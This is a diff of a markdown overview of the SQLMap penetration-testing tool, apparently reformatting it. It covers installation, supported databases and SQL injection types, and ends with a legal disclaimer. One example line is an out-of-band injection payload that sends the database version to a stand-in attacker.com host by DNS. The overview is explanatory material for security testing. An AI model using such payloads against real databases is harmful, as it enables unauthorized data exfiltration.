@@ -1,13 +1,17 @@
 # SQLMap Overview
 SQLMap is a free and open-source penetration testing tool written in Python. It automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap has been continuously developed since 2006.
 
+---
+
 ## Installation
 SQLMap is pre-installed on most security-focused operating systems. To install manually:
-`
+```
 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 cd sqlmap-dev
 python sqlmap.py
-`
+```
+
+---
 
 ## Supported Databases
 SQLMap supports the following DBMSes:
@@ -21,6 +25,8 @@ SQLMap supports the following DBMSes:
 -  Amazon Redshift
 -  Apache Ignite
 
+---
+
 ## Supported SQL Injection Types
 SQLMap can detect and exploit:
 - **Boolean-based Blind**
@@ -29,6 +35,8 @@ SQLMap can detect and exploit:
 - **Stacked Queries**
 - **Time-based Blind**
 - **Out-of-band**
+
+---
 
 ## Examples of SQL Injection Techniques
 
@@ -55,6 +63,8 @@ Differentiates responses based on the server's response time.
 ### Out-of-band SQL Injection
 > Example Query: LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
 This advanced SQLi type uses DNS requests to exfiltrate data.
+
+---
 
 ## Legal Disclaimer
 Usage of SQLMap without proper authorization is illegal. Always ensure you have explicit permission before testing any system.
